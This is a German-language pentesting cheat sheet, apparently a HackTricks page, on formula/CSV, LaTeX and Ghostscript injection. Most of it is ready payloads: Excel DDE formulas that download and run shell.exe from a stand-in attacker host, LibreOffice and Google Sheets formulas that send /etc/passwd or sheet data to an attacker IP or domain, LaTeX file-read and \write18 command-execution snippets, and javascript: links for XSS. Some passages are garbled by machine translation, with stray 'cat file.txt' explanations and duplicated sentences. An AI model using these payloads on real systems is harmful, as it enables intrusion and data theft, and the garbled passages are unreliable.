# Formel/CSV/Doc/LaTeX/GhostScript-Injection

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **GitHub-Repositories** senden.

</details>

<figure><img src="../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Finden Sie die wichtigsten Sicherheitsl√ºcken, damit Sie sie schneller beheben k√∂nnen. Intruder verfolgt Ihre Angriffsfl√§che, f√ºhrt proaktive Bedrohungsscans durch und findet Probleme in Ihrer gesamten Technologie-Stack, von APIs √ºber Webanwendungen bis hin zu Cloud-Systemen. [**Probieren Sie es noch heute kostenlos aus**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks).

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Formel-Injection

### Info

Wenn Ihre **Eingabe** in **CSV-Dateien** (oder in einer anderen Datei, die wahrscheinlich von **Excel** ge√∂ffnet wird) **reflektiert** wird, k√∂nnen Sie m√∂glicherweise Excel-**Formeln** einf√ºgen, die ausgef√ºhrt werden, wenn der Benutzer die Datei √∂ffnet oder wenn der Benutzer auf einen Link in der Excel-Tabelle klickt.

{% hint style="danger" %}
Heutzutage **warnt Excel** (mehrmals) den Benutzer, wenn etwas von au√üerhalb von Excel geladen wird, um ihn vor b√∂sartigen Aktionen zu sch√ºtzen. Daher muss besondere Anstrengung bei der Social Engineering auf die endg√ºltige Nutzlast angewendet werden.
{% endhint %}

### [Wordlist](https://github.com/payloadbox/csv-injection-payloads)
```
DDE ("cmd";"/C calc";"!A0")A0
@SUM(1+9)*cmd|' /C calc'!A0
=10+20+cmd|' /C calc'!A0
=cmd|' /C notepad'!'A1'
=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1
```
### Hyperlink

**Das folgende Beispiel ist sehr n√ºtzlich, um Inhalte aus der endg√ºltigen Excel-Tabelle zu exfiltrieren und Anfragen an beliebige Standorte durchzuf√ºhren. Es erfordert jedoch, dass der Benutzer auf den Link klickt (und die Warnhinweise akzeptiert).**

Das folgende Beispiel wurde von [https://payatu.com/csv-injection-basic-to-exploit](https://payatu.com/csv-injection-basic-to-exploit) √ºbernommen.

Stellen Sie sich vor, es wird eine Sicherheitsl√ºcke in einem Studentenverwaltungssystem ausgenutzt, indem ein CSV-Injektionsangriff durchgef√ºhrt wird. Die Hauptabsicht des Angreifers besteht darin, das System zu kompromittieren, das von Lehrern zur Verwaltung von Sch√ºlerdaten verwendet wird. Die Methode beinhaltet, dass der Angreifer eine b√∂sartige Nutzlast in die Anwendung injiziert, indem er sch√§dliche Formeln in Felder eingibt, die f√ºr Sch√ºlerdetails vorgesehen sind. Der Angriff verl√§uft wie folgt:

1. **Injektion der b√∂sartigen Nutzlast:**
- Der Angreifer sendet ein Formular f√ºr Sch√ºlerdetails ein, enth√§lt jedoch eine in Tabellenkalkulationen h√§ufig verwendete Formel (z. B. `=HYPERLINK("<b√∂sartiger_link>","Hier klicken")`).
- Diese Formel ist so konzipiert, dass sie einen Hyperlink erstellt, der jedoch auf einen b√∂sartigen Server zeigt, der vom Angreifer kontrolliert wird.

2. **Exportieren der kompromittierten Daten:**
- Lehrer, die sich der Kompromittierung nicht bewusst sind, verwenden die Funktion der Anwendung, um die Daten in eine CSV-Datei zu exportieren.
- Die CSV-Datei enth√§lt beim √ñffnen immer noch die b√∂sartige Nutzlast. Diese Nutzlast erscheint als anklickbarer Hyperlink in der Tabelle.

3. **Ausl√∂sen des Angriffs:**
- Ein Lehrer klickt auf den Hyperlink und glaubt, dass er ein legitimer Bestandteil der Sch√ºlerdetails ist.
- Beim Klicken werden sensible Daten (potenziell einschlie√ülich Details aus der Tabelle oder dem Computer des Lehrers) an den Server des Angreifers √ºbertragen.

4. **Protokollierung der Daten:**
- Der Server des Angreifers empf√§ngt und protokolliert die sensiblen Daten, die vom Computer des Lehrers gesendet wurden.
- Der Angreifer kann diese Daten dann f√ºr verschiedene b√∂sartige Zwecke verwenden und so die Privatsph√§re und Sicherheit der Sch√ºler und der Institution weiter gef√§hrden.


### RCE

**Weitere Details finden Sie im [Originalbeitrag](https://notsosecure.com/data-exfiltration-formula-injection-part1).**

In bestimmten Konfigurationen oder √§lteren Versionen von Excel kann eine Funktion namens Dynamic Data Exchange (DDE) ausgenutzt werden, um beliebige Befehle auszuf√ºhren. Um dies zu nutzen, m√ºssen die folgenden Einstellungen aktiviert sein:

- Navigieren Sie zu Datei ‚Üí Optionen ‚Üí Trust Center ‚Üí Trust Center-Einstellungen ‚Üí Externe Inhalte und aktivieren Sie **Dynamic Data Exchange Server starten**.

Wenn eine Tabelle mit der b√∂sartigen Nutzlast ge√∂ffnet wird (und wenn der Benutzer die Warnungen akzeptiert), wird die Nutzlast ausgef√ºhrt. Zum Beispiel w√ºrde die Nutzlast verwendet, um die Taschenrechneranwendung zu starten:
```markdown
`=cmd|' /C calc'!xxx`
```
Zus√§tzliche Befehle k√∂nnen ebenfalls ausgef√ºhrt werden, wie das Herunterladen und Ausf√ºhren einer Datei mit PowerShell:
```bash
=cmd|' /C powershell Invoke-WebRequest "http://www.attacker.com/shell.exe" -OutFile "$env:Temp\shell.exe"; Start-Process "$env:Temp\shell.exe"'!A1
```
### Lokale Dateieinschlie√üung (LFI) in LibreOffice Calc

LibreOffice Calc kann verwendet werden, um lokale Dateien zu lesen und Daten zu exfiltrieren. Hier sind einige Methoden:

- Lesen der ersten Zeile aus der lokalen Datei `/etc/passwd`: `='file:///etc/passwd'#$passwd.A1`
- Exfiltration der gelesenen Daten an einen vom Angreifer kontrollierten Server: `=WEBSERVICE(CONCATENATE("http://<Angreifer-IP>:8080/",('file:///etc/passwd'#$passwd.A1)))`
- Exfiltration von mehr als einer Zeile: `=WEBSERVICE(CONCATENATE("http://<Angreifer-IP>:8080/",('file:///etc/passwd'#$passwd.A1)&CHAR(36)&('file:///etc/passwd'#$passwd.A2)))`
- DNS-Exfiltration (Senden der gelesenen Daten als DNS-Anfragen an einen vom Angreifer kontrollierten DNS-Server): `=WEBSERVICE(CONCATENATE((SUBSTITUTE(MID((ENCODEURL('file:///etc/passwd'#$passwd.A19)),1,41),"%","-")),".<Angreifer-Domain>"))`

### Google Sheets f√ºr Out-of-Band (OOB) Datenexfiltration

Google Sheets bietet Funktionen, die f√ºr die OOB-Datenexfiltration ausgenutzt werden k√∂nnen:

- **CONCATENATE**: F√ºgt Zeichenketten zusammen - `=CONCATENATE(A2:E2)`
- **IMPORTXML**: Importiert Daten aus strukturierten Datentypen - `=IMPORTXML(CONCAT("http://<Angreifer-IP:Port>/123.txt?v=", CONCATENATE(A2:E2)), "//a/a10")`
- **IMPORTFEED**: Importiert RSS- oder ATOM-Feeds - `=IMPORTFEED(CONCAT("http://<Angreifer-IP:Port>//123.txt?v=", CONCATENATE(A2:E2)))`
- **IMPORTHTML**: Importiert Daten aus HTML-Tabellen oder -Listen - `=IMPORTHTML (CONCAT("http://<Angreifer-IP:Port>/123.txt?v=", CONCATENATE(A2:E2)),"table",1)`
- **IMPORTRANGE**: Importiert einen Zellbereich aus einer anderen Tabelle - `=IMPORTRANGE("https://docs.google.com/spreadsheets/d/[Sheet_Id]", "sheet1!A2:E2")`
- **IMAGE**: F√ºgt ein Bild in eine Zelle ein - `=IMAGE("https://<Angreifer-IP:Port>/images/srpr/logo3w.png")`


## LaTeX-Injection

Normalerweise verwenden die Server, die im Internet zu finden sind und **LaTeX-Code in PDF konvertieren**, **`pdflatex`**.\
Dieses Programm verwendet 3 Hauptattribute, um die Ausf√ºhrung von Befehlen zu (de)aktivieren:

* **`--no-shell-escape`**: Deaktiviert die Konstruktion `\write18{command}`, auch wenn sie in der Datei texmf.cnf aktiviert ist.
* **`--shell-restricted`**: Gleich wie `--shell-escape`, aber auf einen 'sicheren' Satz von **vordefinierten** \*\*Befehlen beschr√§nkt (\*\*In Ubuntu 16.04 befindet sich die Liste in `/usr/share/texmf/web2c/texmf.cnf`).
* **`--shell-escape`**: Aktiviert die Konstruktion `\write18{command}`. Der Befehl kann ein beliebiger Shell-Befehl sein. Diese Konstruktion ist normalerweise aus Sicherheitsgr√ºnden deaktiviert.

Es gibt jedoch andere M√∂glichkeiten, Befehle auszuf√ºhren. Um RCE zu vermeiden, ist es daher sehr wichtig, `--shell-restricted` zu verwenden.

### Datei lesen <a href="#read-file" id="read-file"></a>

M√∂glicherweise m√ºssen Sie die Injektion mit Wrappern wie \[ oder $ anpassen.
```bash
\input{/etc/passwd}
\include{password} # load .tex file
\lstinputlisting{/usr/share/texmf/web2c/texmf.cnf}
\usepackage{verbatim}
\verbatiminput{/etc/passwd}
```
#### Einzeilige Datei lesen

To read a single-lined file, you can use the following command:

Um eine einzeilige Datei zu lesen, k√∂nnen Sie den folgenden Befehl verwenden:

```bash
cat file.txt
```

This command will display the contents of the file on the terminal.

Dieser Befehl zeigt den Inhalt der Datei im Terminal an.
```bash
\newread\file
\openin\file=/etc/issue
\read\file to\line
\text{\line}
\closein\file
```
#### Mehrzeilige Datei lesen

Um eine mehrzeilige Datei zu lesen, k√∂nnen Sie den folgenden Befehl verwenden:

```bash
cat dateiname.txt
```

Dieser Befehl gibt den gesamten Inhalt der Datei `dateiname.txt` auf der Standardausgabe aus. Sie k√∂nnen den Dateinamen entsprechend anpassen.
```bash
\newread\file
\openin\file=/etc/passwd
\loop\unless\ifeof\file
\read\file to\fileline
\text{\fileline}
\repeat
\closein\file
```
### Datei schreiben <a href="#write-file" id="write-file"></a>
```bash
\newwrite\outfile
\openout\outfile=cmd.tex
\write\outfile{Hello-world}
\closeout\outfile
```
### Befehlsausf√ºhrung <a href="#befehlsausf√ºhrung" id="befehlsausf√ºhrung"></a>

Die Eingabe des Befehls wird auf stdin umgeleitet, verwenden Sie eine tempor√§re Datei, um sie zu erhalten.
```bash
\immediate\write18{env > output}
\input{output}

\input{|"/bin/hostname"}
\input{|"extractbb /etc/passwd > /tmp/b.tex"}

# allowed mpost command RCE
\documentclass{article}\begin{document}
\immediate\write18{mpost -ini "-tex=bash -c (id;uname${IFS}-sm)>/tmp/pwn" "x.mp"}
\end{document}

# If mpost is not allowed there are other commands you might be able to execute
## Just get the version
\input{|"bibtex8 --version > /tmp/b.tex"}
## Search the file pdfetex.ini
\input{|"kpsewhich pdfetex.ini > /tmp/b.tex"}
## Get env var value
\input{|"kpsewhich -expand-var=$HOSTNAME > /tmp/b.tex"}
## Get the value of shell_escape_commands without needing to read pdfetex.ini
\input{|"kpsewhich --var-value=shell_escape_commands > /tmp/b.tex"}
```
Wenn Sie einen LaTex-Fehler erhalten, sollten Sie in Betracht ziehen, base64 zu verwenden, um das Ergebnis ohne ung√ºltige Zeichen zu erhalten.
```bash
\immediate\write18{env | base64 > test.tex}
\input{text.tex}
```

```bash
\input|ls|base4
\input{|"/bin/hostname"}
```
### Cross-Site Scripting <a href="#cross-site-scripting" id="cross-site-scripting"></a>

Von [@EdOverflow](https://twitter.com/intigriti/status/1101509684614320130)
```bash
\url{javascript:alert(1)}
\href{javascript:alert(1)}{placeholder}
```
## Ghostscript-Injection

**√úberpr√ºfen Sie [https://blog.redteam-pentesting.de/2023/ghostscript-overview/](https://blog.redteam-pentesting.de/2023/ghostscript-overview/)**

## Referenzen

* [https://notsosecure.com/data-exfiltration-formula-injection-part1](https://notsosecure.com/data-exfiltration-formula-injection-part1)
* [https://0day.work/hacking-with-latex/](https://0day.work/hacking-with-latex/)
* [https://salmonsec.com/cheatsheet/latex\_injection](https://salmonsec.com/cheatsheet/latex\_injection)
* [https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/](https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/)

<figure><img src="../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Finden Sie die wichtigsten Schwachstellen, damit Sie sie schneller beheben k√∂nnen. Intruder verfolgt Ihre Angriffsfl√§che, f√ºhrt proaktive Bedrohungsscans durch und findet Probleme in Ihrer gesamten Technologie-Stack, von APIs √ºber Webanwendungen bis hin zu Cloud-Systemen. [**Probieren Sie es noch heute kostenlos aus**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks).

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
